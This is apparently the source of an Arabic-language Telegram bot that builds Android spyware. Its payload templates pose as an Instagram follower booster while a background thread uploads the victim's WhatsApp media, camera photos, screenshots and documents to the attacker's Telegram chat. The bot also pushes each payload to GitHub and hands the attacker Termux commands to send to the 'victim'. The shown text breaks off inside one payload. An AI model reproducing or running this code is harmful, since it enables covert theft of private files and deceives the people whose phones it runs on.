import sys
import subprocess
import sqlite3
import telebot
from telebot import types
from config import *
import base64
import os
import uuid
import requests
import time
import string
import random


bot = telebot.TeleBot(TOKEN)

def creat_connection():
	conn = sqlite3.connect('mybot.db')
	return conn

hack = {
'1' : [
('سحب صوتيات واتساب فقط 🥶☠️️','watsaudio'),
('سحب فيديوهات واتساب فقط 😎😈️','watsvid'),
('سحب صور واتساب فقط 🚀🔥','watsphoto'),
('سحب قاعدة بيانات واتساب لقراءة الرسايل ☠️🔥️','watsdb'),
('سحب ملفات واتساب بالكامل ☺️','wats'),
('سحب فيديوهات الكاميرا فقط ☠️🔥️','camvid'),
('سحب صور الكاميرا فقط 🙂️','camimg'),
('سحب صور وفيديوهات الكاميرا مع بعض 📸', 'camera'),
('سحب صور بالكامل 😱', 'img'),
('سحب فيديوهات بالكامل 😈', 'vid'),
('سحب مستندات بالكامل 📂', 'doc'),
('سحب ملفات Download 📥', 'dow'),
('سحب لقطات الشاشة 😨', 'screan')
]
}

tool = {
'1' : [
	  ('رشق حسابات إنستجرام 👍', 'rsq'),
	  #('تخمين باسوردات فيسبوك 😝', 'face'),
#	  ('رشق متابعين تيكتوك 💟 😍', 'tik'),
#	  ('استخراج متاحات 😱', 'mtah'),
#	  ('فحص فيز 📊', 'fiz'),
#	  ('اختراق وايفاي 🥷', 'wifi'),
#	  ('سبام رسايل 😈', 'smsspam'),
#	  ('سبام مكالمات 🎙', 'callspam'),
#	  ('سبام إيميل 📨', 'emailspam')
 ]
}

stt = {}

# —-----------لوحة الادمن—--------------
@bot.message_handler(commands=['admin'])
def admin(message):
	user_id = message.chat.id
	if user_id == ADMIN:
		bot.reply_to(message, '''
أهلا بك في لوحة الآدمن 💟
يمكنك تنفيذ الأوامر الآتية: 
/forward لعمل إذاعة لجميع المستخدمين
/count لمعرفة عدد المستخدمين
/user لعرض بيانات المستخدمين
		''')
@bot.message_handler(commands=['forward'])
def forwarding(message):
	usr = message.from_user.id
	if usr == ADMIN:
		ms = bot.reply_to(message, 'أرسل رسالتك لإعادة توجيهها إلى جميع المستخدمين..')
		bot.register_next_step_handler(ms, pro)

def pro(message):
	msg = message.text
	conn = creat_connection()
	cursor = conn.cursor()
	cursor.execute('SELECT user_id FROM user')
	ids = cursor.fetchall()
	conn.close()
	for id in ids:
		usr_id = id[0]
		try:
			bot.send_message(chat_id=usr_id, text=msg)
		except:
			pass

@bot.message_handler(commands=['count'])
def counting(message):
	id = message.from_user.id
	if id == ADMIN:
		conn = creat_connection()
		cursor = conn.cursor()
		cursor.execute('SELECT user_id FROM user')
		all = cursor.fetchall()
		conn.close()
		allL = len(all)
		bot.reply_to(message, f'''
عدد مستخدمي البوت هو : {allL}'
	''')
@bot.message_handler(commands=['user'])
def users(message):
	id = message.from_user.id
	if id == ADMIN:
		conn = creat_connection()
		cursor = conn.cursor()
		cursor.execute('SELECT * FROM user')
		all = cursor.fetchall()
		all_u = 'جميع المستخدمين : \n\n' + '\n'.join([str(al) for al in all])
		bot.send_message(chat_id=message.chat.id, text = all_u)
		conn.close()


# ------------(لوحة الادمن)---------------

#-----------refrral Caode-------

@bot.message_handler(commands=['refrral_code'])
def refrral(message):
    id = message.from_user.id
    conn = creat_connection()
    cursor = conn.cursor()

    cursor.execute('SELECT refrralcode, points FROM user WHERE user_id = ?', (id,))
    result = cursor.fetchone()

    if result:
        ref = result[0]
        points = result[1]
        if ref is None:
            referral_code = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            cursor.execute('UPDATE user SET refrralcode = ? WHERE user_id = ?', (referral_code, id))
            conn.commit()
            bot_username = "Atmaja5788_bot"
            reff = f'https://t.me/{bot_username}?start={referral_code}'
            bot.send_message(chat_id=message.chat.id, text=f'''
تم توليد كود إحالة خاص بك، أرسله لأصدقائك وأي شخص يدخل للبوت عن طريق هذا الرابط سيتم إضافة نقطتين إلى حسابك 🤩
نقاطك الحالية: {points}
رابط الاحالة الخاص بك: 
{reff}
''')
        else:
            bot_username = "Atmaja5788_bot"
            refff = f'https://t.me/{bot_username}?start={ref}'
            bot.send_message(chat_id=message.chat.id, text=f'''
لديك رابط إحالة بالفعل:
{refff}
''')
    else:
        bot.send_message(chat_id=message.chat.id, text='بياناتك غير مدرجة بقاعدة البيانات.. الرجاء الضغط /start أولا ثم اضغط /refrral_code')
    
    conn.close()

#-----------End refrral Caode-------


def creat_payloads(id, ms, payload):
	bot.edit_message_text(chat_id=id, message_id=ms, text='جاري المعالجة ... 🔥🚀')
	bot.send_chat_action(id, 'typing')
	time.sleep(2)
	unique_filename = f"payloads/{uuid.uuid4().hex}.py"
	os.makedirs(os.path.dirname(unique_filename), exist_ok=True)
	with open(unique_filename, "w") as file:
				file.write(payload)
	try:
		with open(unique_filename, "rb") as file:
			bot.send_document(chat_id=id, document=file, caption='ملف بايثون محقون ارسله للضحية كي يشغله في بايدرويد 🔥🚀')
		with open(unique_filename, "rb") as file:
			content = file.read()
                
			url = f"https://api.github.com/repos/{REPO_NAME}/contents/{os.path.basename(unique_filename)}"
			headers = {
                    'Authorization': f'token {GITHUB_TOKEN}',
                    'Content-Type': 'application/json',
                }
			content_base64 = base64.b64encode(content).decode('utf-8')
			data = {
                    'message': f'Upload {os.path.basename(unique_filename)}',
                    'content': content_base64,
                    'branch': BRANCH_NAME
                }

			response = requests.put(url, json=data, headers=headers)

			if response.status_code == 201:
				pk = 'pkg update\npkg upgrade -Y\npkg install python -Y\npkg install git -Y\ngit config --global --unset credential.helper\ngit config --global --unset user.name\ngit config --global --unset user.password\n'
				clone_command = f"git clone https://github.com/esamkido1994/atmaja_bot2/{REPO_NAME.split('/')[-1]}.git\n"
				cd_command = f"cd {REPO_NAME.split('/')[-1]}\n"
				pull = "git pull origin main\n"
				run_command = f"python {os.path.basename(unique_filename)}\n"

				commands = pk + clone_command + cd_command + pull + run_command
				bot.send_message(chat_id=id, text=f"""
قم بنسخ الأوامر التالية وأرسلها للضحية لبدأ الاختراق 😈🔥

```bash
{commands}
```

By: hitler hack 
""", parse_mode="Markdown"
)
			else:
					bot.send_message(chat_id=id, text=f"Failed to upload file88: {response.text}")

	except Exception as e:
				bot.send_message(chat_id=id, text=f"Failed to upload file: {e}")
#-----—--------—-----------------------------

def send_sure(reff):
	conn = creat_connection()
	cursor = conn.cursor()
	cursor.execute('SELECT user_id FROM user WHERE refrralcode = ?', (reff,))
	iid = cursor.fetchone()[0]
	bot.send_message(chat_id=iid, text='لقد تمت إضافة 3 نقاط إلى حسابك من خلال رابط الإحالة 🙂')


def check_sub(user_id):
	member = bot.get_chat_member(CHANNEL_ID, user_id)
	return member.status in ['member', 'administrator', 'creator']

@bot.message_handler(commands=['start'])
def start(message):
	chat_id = message.chat.id
	user_id = message.from_user.id
	username = message.from_user.username
	first_name = message.from_user.first_name
	stt[chat_id] = None
	
	conn = creat_connection()
	cursor = conn.cursor()
	
	cursor.execute('''INSERT OR IGNORE INTO user(user_id,
	    username,
	    first_name)
	    VALUES (?,?,?)''',
	    (user_id,username, first_name)
	    
	    )
	conn.commit()
	conn.close()
	
	refrr = message.text.split(' ')[1] if len(message.text.split(' ')) > 1 else None

	if refrr is not None:
		conn = creat_connection()
		cursor = conn.cursor()

		cursor.execute('SELECT referral_points_added FROM user WHERE user_id = ?', (chat_id,))
		result = cursor.fetchone()

		if result is not None and result[0] == 0: 
			cursor.execute('UPDATE user SET points = points + 3 WHERE refrralcode = ?', (refrr,))
        
			cursor.execute('UPDATE user SET referral_points_added = 1 WHERE user_id = ?', (chat_id,))
        
			conn.commit()
			conn.close()
			send_sure(refrr)
	
	keyboard = types.InlineKeyboardMarkup(row_width=1)
	
	key = types.InlineKeyboardMarkup(row_width=1)
	
	keyboard.add(
	   types.InlineKeyboardButton(text='إشتراك 🤩', url='https://t.me/esam66180')
	)

	for key1, val in hack['1']:
		key.add(
		  types.InlineKeyboardButton(text=key1, callback_data=val)
		)	
	conn = creat_connection()
	cursor = conn.cursor()
	
	cursor.execute('''INSERT OR IGNORE INTO user(user_id,
	    username,
	    first_name)
	    VALUES (?,?,?)''',
	    (user_id,username, first_name)
	    
	    )
	conn.commit()
	conn.close()
	    
	if not check_sub(user_id):
	       bot.send_message(chat_id=chat_id, text= 'عذرا عليك الاشتراك في قناة المطور أولا 🙂 اشترك ثم أرسل /start للتحقق', reply_markup=keyboard)
        
	else:
		bot.send_message(chat_id=chat_id, text=f'''
أهلاً {first_name} 😘
هذا البوت مخصص لاختبار الاختبار الأخلاقي والمطور غير مسؤول عن أي استخدام سيء للبوت 🤯

الأوامر: 😱
- تلغيم أداة اختراق ملفات واتساب الصوتية المرسلة والمستلمة 😈
- تلغيم أداة اختراق صور واتساب، المرسلة والمستلمة 😵
- تلغيم أداة اختراق فيديوهات واتساب المرسلة والمستلمة 🤫
- تلغيم أداة اختراق مستندات الواتساب المرسلة والمستلمة 👨‍💻
- تلغيم أداة اختراق صور الكاميرا ☠
- تلغيم أداة اختراق الصور من الذاكرة الرئيسية 😱
- تلغيم أداة اختراق فيديوهات الكاميرا 😰
- تلغيم أداة اختراق فيديوهات من الذاكرة الرئيسية عامةً 🫣
- تلغيم أداة اختراق مستندات من الذاكرة الرئيسية 🥱
- تلغيم أداة اختراق مجلد Download خاص بتنزيلات تيليجرام🚬
- أداة تلغيم اختراق صور لقطات الشاشة 📸

جميع البيانات المسحوبة سوف تصلك في هذا البوت بمجرد تشغيل الأداة. 😵
البوت سريع جداً 👌

المطور: هتلر هاك 👤
حساب المطور: https://t.me/hitler_7x
قناة هتلر: https://t.me/esam66180
	''' ,reply_markup=key)
	
@bot.callback_query_handler(func=lambda call: call.data == 'wats' or call.data == 'camera' or call.data == 'img' or call.data == 'vid' or call.data == 'doc' or call.data == 'dow' or call.data == 'screan' or call.data == 'watsdb' or call.data == 'watsvid' or call.data == 'watsphoto' or call.data == 'watsaudio' or call.data == 'camimg' or call.data == 'camvid')
def creat_tool(call):
	chat_id = call.message.chat.id
	call_data = call.data
	tooll = types.InlineKeyboardMarkup()
	stt[chat_id] = call_data
	for key, val in tool['1']:
		tooll.add(
		  types.InlineKeyboardButton(text=key, callback_data=val)
		)
		
	conn = creat_connection()
	cursor = conn.cursor()
	cursor.execute('SELECT points FROM user WHERE user_id = ?', (chat_id,))
	ppoin1 = cursor.fetchone()
	if ppoin1 is not None:
		ppoin = ppoin1[0]
	
		bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'''
اختراق الملفات والواتساب فايل بدون أي برامج، عن طريق تيرمكس فقط 😍
وداعاً للبرامج المكشوفة 🙈
وداعاً للبرامج المدفوعة 🥷

• عند الضغط على أحد الازرار في الأسفل سيتم خصم 3 نقاط من حسابك
• نقاطك الحالية هي : {ppoin}

اضغط /start للعودة للقائمة الرئيسية 😈
لجمع النقاط من خلال رابط الاحالة اضغط /refrral_code

🔰 Dev: @esam66180

اختر شكل الأداة الملغمة ⬇️
	''' , reply_markup=tooll)
	
@bot.callback_query_handler(func=lambda call:True)
def call_handle(call):
	id = call.message.chat.id
	ms = call.message.message_id
	user_id = call.message.from_user.id
	data = call.data
	stt[id] = stt.get(id)
	
	creat_payload(ms, id, user_id, data, stt[id])


# ----------Creat Payloads-----------

def creat_payload(ms, id, user_id, first_data, second_data):
	payload = None
	if first_data == 'rsq':
		conn = creat_connection()
		cursor = conn.cursor()
		cursor.execute('SELECT points FROM user  WHERE user_id = ?', (id,))
		result = cursor.fetchone()
		if result is None:
			pass
		else:
			point = result[0]
			if (point < 3 and id != ADMIN):
				bot.send_message(chat_id=id, text='''عذراً، نقاطك أقل من 3 نقاط 🥺
اضغط /refrral_code للحصول على رابط إحالة وتجميع النقاط.
''')
			else:
					cursor.execute('UPDATE user SET points = points - 3 WHERE user_id = ?', (id,))
					conn.commit()
					conn.close()
		
					if second_data == 'img':

						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests
    
bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/"
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')

def background():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
            	file_path = os.path.join(root, file)
            	if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp", ".PNG", ".JPG", ".JPEG")):
            		executor.submit(send_file, file_path)

threading.Thread(target=background).start()

Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script 💘.   \n ⌯ اهلا بك في اداه رشق متابعين انستغرام هذة الأداة مجانية مقدمة من هتلر 💘.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests 💞💞.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests 💞💞.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests 💞💞.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests 💞💞.   """) '''
						creat_payloads(id, ms, payload)
					elif second_data == 'wats':
			
						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests
    
bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/Android/media/"

def send_voice(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".opus",".mp3", ".aac")):
            bot.send_audio(chat_id={id}, audio=f, caption='By: @Atmaja5788_bot')

def send_phot(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')

def send_video(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".mp4")):
            bot.send_video(chat_id={id}, video=f, caption='By: @Atmaja5788_bot')

def send_doc(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
            bot.send_document(chat_id={id}, document=f, caption='By: @Atmaja5788_bot')

def back():
	with ThreadPoolExecutor(max_workers=300) as executor:
		for root, dirs, files in os.walk(dir_path):
			for file in files:
				file_path = os.path.join(root, file)
				if file_path.lower().endswith((".opus",".mp3", ".aac")):
					executor.submit(send_voice, file_path)
				elif file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
					executor.submit(send_phot, file_path)
				elif file_path.lower().endswith((".mp4")):
					executor.submit(send_video, file_path)
				elif file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
					executor.submit(send_doc, file_path)

threading.Thread(target=back).start()

Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script 💘.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام 💘.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests 💞💞.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests 💞💞.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests 💞💞.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests 💞💞.   """)  '''
						creat_payloads(id, ms, payload)
					elif second_data == 'camera':
						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests
    
bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/DCIM/Camera/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')

def background():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
            	file_path = os.path.join(root, file)
            	if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp", ".PNG", ".JPG", ".JPEG")):
            		executor.submit(send_file, file_path)

threading.Thread(target=background).start()

Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script 💘.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام 💘.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests 💞💞.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests 💞💞.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests 💞💞.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests 💞💞.   """)  '''
						creat_payloads(id, ms, payload)
					elif second_data == 'screan':
						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests
    
bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/DCIM/Screenshots/"
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')

def background():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
            	file_path = os.path.join(root, file)
            	if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp", ".PNG", ".JPG", ".JPEG")):
            		executor.submit(send_file, file_path)

threading.Thread(target=background).start()

Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script 💘.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام 💘.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests 💞💞.   """)
if (Abs == '3'):
